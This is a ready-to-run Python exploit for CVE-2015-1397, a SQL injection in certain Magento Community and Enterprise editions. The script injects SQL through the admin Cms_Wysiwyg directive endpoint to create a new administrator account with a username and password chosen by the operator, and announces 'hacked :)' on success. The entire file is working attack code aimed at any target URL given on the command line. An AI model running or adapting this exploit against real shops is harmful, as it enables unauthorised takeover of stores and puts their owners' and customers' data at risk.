import requests
import sys
import base64
import argparse
from log_colors import *

# SQL injection vulnerability in the getCsvFile
# function in the Mage_Adminhtml_Block_Widget_Grid
# class in Magento Community Edition (CE) 1.9.1.0 
# and Enterprise Edition (EE) 1.14.1.0 
# allows remote administrators to execute arbitrary 
# SQL commands via the popularity[field_expr] 
# parameter when the popularity[from] or popularity[to] parameter is set.
class CVE2015_1397:

    def __init__(self, url, user, pswd):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pswd = user, pswd
        self.session = requests.Session()

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        q = "SET @SALT = 'rp';"
        q += "SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{passwd}')".format(passwd = self.pswd)
        q += " ), CONCAT(':', @SALT ));"
        q += "SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;"
        q += "INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,"
        q += "`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,"
        q += "`rp_token_created_at`) "
        q += "VALUES ('Firstname','Lastname','hacked@hack.com','{user}',".format(user = self.user)
        q += "@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());"
        q += "INSERT INTO `admin_role` (parent_id,tree_level,sort_order,"
        q += "role_type,user_id,role_name) "
        q += "VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username ="
        q = q.replace("\n", "")
        q += " '{user}'),'Firstname');".format(user = self.user)
        pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(q)
        print (LogColors.YELLOW + pfilter + "..." + LogColors.ENDC)
        data = {
            "___directive" : "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
            "filter" : base64.b64encode(pfilter.encode()).decode(),
            "forwarded" : 1
        }
        r = self.session.post(
            self.url.rstrip("/") + "/index.php/admin/Cms_Wysiwyg/directive/index/",
            data = data
        )
        if r.ok:
            print (LogColors.YELLOW + "auth: " + self.user + ":" + self.pswd + LogColors.ENDC)
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "sending payload failed :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-user','--username', required = True, help = "auth username")
    parser.add_argument('-pswd','--password', required = True, help = "auth password")
    args = vars(parser.parse_args())
    url = args["url"]
    user, pswd = args["username"], args["password"]
    cve = CVE2015_1397(url, user, pswd)
    cve.exploit()

